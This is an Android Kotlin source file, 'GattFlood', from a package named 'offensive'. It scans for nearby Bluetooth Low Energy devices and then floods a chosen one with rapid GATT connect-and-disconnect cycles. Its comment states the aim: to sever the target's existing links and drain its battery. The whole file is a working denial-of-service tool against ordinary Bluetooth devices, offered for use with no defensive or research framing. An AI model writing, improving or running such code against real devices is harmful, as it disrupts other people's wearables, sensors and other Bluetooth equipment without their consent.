package com.droid.whaly.offensive

import android.annotation.SuppressLint
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothGatt
import android.bluetooth.BluetoothGattCallback
import android.bluetooth.BluetoothManager
import android.bluetooth.le.ScanCallback
import android.bluetooth.le.ScanResult
import android.bluetooth.le.ScanSettings
import android.content.Context
import android.util.Log
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicBoolean

data class FloodTarget(val address: String, val name: String, val rssi: Int)

/**
 * Connection storm: opens GATT links as fast as the controller allows and drops them.
 * Targets with few connection slots lose their existing links; battery drains on both sides.
 */
object GattFlood {

    private const val TAG = "GattFlood"
    private val running = AtomicBoolean(false)
    private val executor = Executors.newSingleThreadExecutor()

    private val _targets = MutableStateFlow<List<FloodTarget>>(emptyList())
    val targets: StateFlow<List<FloodTarget>> = _targets.asStateFlow()

    private val _scanning = MutableStateFlow(false)
    val scanning: StateFlow<Boolean> = _scanning.asStateFlow()

    private val _attempts = MutableStateFlow(0)
    val attempts: StateFlow<Int> = _attempts.asStateFlow()

    private val _activeTarget = MutableStateFlow<FloodTarget?>(null)
    val activeTarget: StateFlow<FloodTarget?> = _activeTarget.asStateFlow()

    @SuppressLint("MissingPermission")
    private fun adapter(context: Context): BluetoothAdapter? = try {
        (context.getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager)?.adapter
    } catch (_: SecurityException) {
        null
    }

    @SuppressLint("MissingPermission")
    fun scan(context: Context, seconds: Int = 8) {
        if (_scanning.value) return
        val scanner = adapter(context)?.bluetoothLeScanner ?: return
        val found = linkedMapOf<String, FloodTarget>()
        _targets.value = emptyList()
        _scanning.value = true
        val callback = object : ScanCallback() {
            override fun onScanResult(callbackType: Int, result: ScanResult) {
                val device = result.device ?: return
                val address = device.address ?: return
                found[address] = FloodTarget(address, device.name ?: "unknown", result.rssi)
                _targets.value = found.values.sortedByDescending { it.rssi }
            }

            override fun onScanFailed(errorCode: Int) {
                Log.w(TAG, "scan failed: $errorCode")
                _scanning.value = false
            }
        }
        try {
            scanner.startScan(
                null,
                ScanSettings.Builder().setScanMode(ScanSettings.SCAN_MODE_LOW_LATENCY).build(),
                callback,
            )
        } catch (error: SecurityException) {
            _scanning.value = false
            return
        }
        executor.execute {
            try {
                Thread.sleep(seconds * 1000L)
            } catch (_: InterruptedException) {
            }
            try {
                scanner.stopScan(callback)
            } catch (_: Exception) {
            }
            _scanning.value = false
        }
    }

    @SuppressLint("MissingPermission")
    fun start(context: Context, target: FloodTarget) {
        if (!running.compareAndSet(false, true)) return
        _activeTarget.value = target
        _attempts.value = 0
        val appContext = context.applicationContext
        executor.execute {
            val adapter = adapter(appContext) ?: run {
                running.set(false)
                return@execute
            }
            val callback = object : BluetoothGattCallback() {
                override fun onConnectionStateChange(gatt: BluetoothGatt, status: Int, newState: Int) {
                    if (newState == BluetoothGatt.STATE_CONNECTED) {
                        try {
                            gatt.discoverServices()
                        } catch (_: Exception) {
                        }
                    }
                }
            }
            while (running.get()) {
                try {
                    val device = adapter.getRemoteDevice(target.address)
                    val gatt = device.connectGatt(appContext, false, callback, android.bluetooth.BluetoothDevice.TRANSPORT_LE)
                    _attempts.value = _attempts.value + 1
                    try {
                        Thread.sleep(1200)
                    } catch (_: InterruptedException) {
                        break
                    }
                    try {
                        gatt.disconnect()
                    } catch (_: Exception) {
                    }
                    try {
                        gatt.close()
                    } catch (_: Exception) {
                    }
                } catch (error: SecurityException) {
                    Log.w(TAG, "connect denied", error)
                    break
                } catch (error: Exception) {
                    Log.w(TAG, "connect failed: ${error.message}")
                    try {
                        Thread.sleep(400)
                    } catch (_: InterruptedException) {
                        break
                    }
                }
            }
            running.set(false)
            _activeTarget.value = null
        }
    }

    fun stop() {
        running.set(false)
    }

    fun isRunning(): Boolean = running.get()
}
